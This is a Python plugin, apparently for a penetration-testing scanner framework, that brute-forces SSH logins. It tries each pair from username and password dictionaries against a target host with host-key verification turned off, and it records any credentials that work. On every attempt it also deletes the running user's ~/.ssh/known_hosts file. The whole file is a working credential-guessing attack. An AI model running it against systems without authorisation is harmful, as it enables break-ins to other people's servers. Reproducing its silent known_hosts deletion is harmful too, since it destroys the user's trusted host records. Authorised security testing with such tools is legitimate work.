#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import sys
import asyncssh
import os
from lib.core.data import paths
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.SSH
        self.name = 'ssh burst'
        self.keyword = ['ssh', 'burst']
        self.info = 'Burst ssh weakpass.'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
            os.path.join(paths.DICT_PATH, 'ssh_usernames.txt'))
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
            os.path.join(paths.DICT_PATH, 'ssh_passwords.txt'))
        async for (username, password) in self.generate_dict(usernamedic, passworddic):
            known_hosts_path = os.path.join(os.path.expanduser('~'), '.ssh', 'known_hosts')
            if os.path.exists(known_hosts_path):
                os.remove(known_hosts_path)
            try:
                async with asyncssh.connect(host=self.target_host, port=self.target_port, username=username,
                                            password=password, known_hosts=None) as conn:
                    self.flag = 1
                    self.res.append({"info": username + "/" + password, "key": "ssh burst"})
                    return
            except asyncssh.misc.ConnectionLost:
                pass
            except:
                pass